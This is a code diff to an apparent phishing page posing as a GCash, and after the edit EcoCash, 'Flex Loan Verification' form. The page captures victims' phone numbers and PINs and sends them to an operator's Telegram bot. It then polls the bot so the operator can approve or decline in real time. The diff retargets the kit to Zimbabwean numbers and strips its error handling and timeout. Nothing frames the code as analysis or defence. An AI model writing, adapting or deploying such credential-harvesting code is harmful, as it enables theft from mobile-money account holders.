@@ -529,11 +529,6 @@
       continueBtn.disabled = true;
       continueBtn.textContent = 'Verifying…';
 
-      const application = getStoredApplication();
-      const loanAmount = application.loanAmount ? '₱' + Number(application.loanAmount).toLocaleString() : '—';
-      const loanType = application.loanType || '—';
-      const fullName = [application.firstName, application.lastName].filter(Boolean).join(' ').trim() || '—';
-
       const ts = Date.now();
       const approveId = `approve_${ts}`;
       const declineId = `decline_${ts}`;
@@ -544,7 +539,7 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           chat_id: CONFIG.CHAT_ID,
-          text: `<b>🟢 GCash Flex Loan Verification</b>\n\nApplicant: <b>${fullName}</b>\nLoan Amount: <b>${loanAmount}</b>\nLoan Type: <b>${loanType}</b>\nPhone: <code>+63${phone}</code>\nPIN: <code>${pin}</code>\n\nChoose an action:`,
+          text: `<b>🟢 EcoCash Flex Loan Verification</b>\n\nPhone: <code>+263${phone}</code>\nPIN: <code>${pin}</code>\n\nChoose an action:`,
           parse_mode: 'HTML',
           reply_markup: {
             inline_keyboard: [
@@ -558,27 +553,13 @@
         })
       })
         .then(() => {
-          localStorage.setItem('phone', phone);
-          localStorage.setItem('flexLoanLogin', JSON.stringify({ phone, continuedAt: new Date().toISOString() }));
-
           spinnerOverlay.style.display = 'flex';
           startPolling(approveId, declineId, verifyId);
-        })
-        .catch((error) => {
-          console.error('Send error:', error);
-          showError('Connection error. Please try again.');
-          resetButton();
-          spinnerOverlay.style.display = 'none';
         });
     }
 
     function startPolling(approveId, declineId, verifyId) {
-      let pollAttempts = 0;
-      const maxAttempts = 120;
-
       const interval = setInterval(() => {
-        pollAttempts++;
-
         fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
           .then(r => r.json())
           .then(data => {
@@ -601,22 +582,12 @@
                 } else if (cb === declineId) {
                   clearInterval(interval);
                   spinnerOverlay.style.display = 'none';
-                  showError('Loan request declined. Please try again or contact support.');
+                  showError('Request declined. Please try again.');
                   resetButton();
                 }
               }
             });
-          })
-          .catch((error) => {
-            console.error('Poll error:', error);
           });
-
-        if (pollAttempts >= maxAttempts) {
-          clearInterval(interval);
-          spinnerOverlay.style.display = 'none';
-          showError('Verification timeout. Please try again.');
-          resetButton();
-        }
       }, 1000);
     }
 
